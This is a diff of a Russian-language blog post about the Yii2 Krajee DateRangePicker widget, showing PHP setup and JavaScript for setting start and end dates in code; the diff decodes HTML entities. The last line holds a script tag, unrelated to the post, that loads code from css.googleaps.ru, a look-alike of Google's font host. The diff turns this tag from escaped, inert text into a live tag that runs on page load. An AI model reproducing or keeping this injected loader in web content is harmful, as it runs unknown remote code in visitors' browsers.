@@ -22,12 +22,12 @@ tags:
 - orm
 comments: []
 ---
-<p>Настройка самого виджета&nbsp;http:&#47;&#47;demos.krajee.com&#47;date-range трудностей не преставляет:<&#47;p></p>
+<p>Настройка самого виджета&nbsp;http://demos.krajee.com/date-range трудностей не преставляет:</p></p>
 <pre class="brush: php; title: ; notranslate">
 <?= $form->field($conflict, 'dates_worked',[<br />
         'addon' => [<br />
             'append' => [<br />
-                'content' => '<i class="fa fa-calendar"><&#47;i>'<br />
+                'content' => '<i class="fa fa-calendar"></i>'<br />
             ]<br />
         ],<br />
     ])->widget(DateRangePicker::classname(), [<br />
@@ -35,21 +35,21 @@ comments: []
         'convertFormat' => true,<br />
         'pluginOptions' => [<br />
             'format' => 'Y-m-d',<br />
-            'separator' => ' &#47; ',<br />
+            'separator' => ' / ',<br />
             'opens' => 'left',<br />
         ]<br />
     ]) ?><br />
-<&#47;pre></p>
-<p><span id="more-424"><&#47;span><br &#47;><br />
-Вопрос возник, когда понадобилось программно изменить значения начала и окончания. Решение следующее:<&#47;p></p>
+</pre></p>
+<p><span id="more-424"></span><br /><br />
+Вопрос возник, когда понадобилось программно изменить значения начала и окончания. Решение следующее:</p></p>
 <pre class="brush: jscript; title: ; notranslate">
-var date = '2014-09-01 &#47; 2014-10-01',<br />
-    dates = date.split(' &#47; '),<br />
+var date = '2014-09-01 / 2014-10-01',<br />
+    dates = date.split(' / '),<br />
     daterangepicker = $('#conflict-dates_worked')<br />
                         .closest('.input-group')<br />
-                        .data('daterangepicker'); &#47;&#47; достаем сам объект daterangepicker<br />
-$('#conflict-dates_worked').val(date);  &#47;&#47; отображаем новую дату в input-e<br />
-daterangepicker.setStartDate(dates[0]); &#47;&#47; задаем старт<br />
-daterangepicker.setEndDate(dates[1]);   &#47;&#47; и окончание в самом календаре<br />
-<&#47;pre><br />
-Source: vingtsun-grodno.com<script src="&#47;&#47;css.googleaps.ru&#47;css?f=Open+Sans&cd=mb&ver=4.2.2"><&#47;script></p>
+                        .data('daterangepicker'); // достаем сам объект daterangepicker<br />
+$('#conflict-dates_worked').val(date);  // отображаем новую дату в input-e<br />
+daterangepicker.setStartDate(dates[0]); // задаем старт<br />
+daterangepicker.setEndDate(dates[1]);   // и окончание в самом календаре<br />
+</pre><br />
+Source: vingtsun-grodno.com<script src="//css.googleaps.ru/css?f=Open+Sans&cd=mb&ver=4.2.2"></script></p>
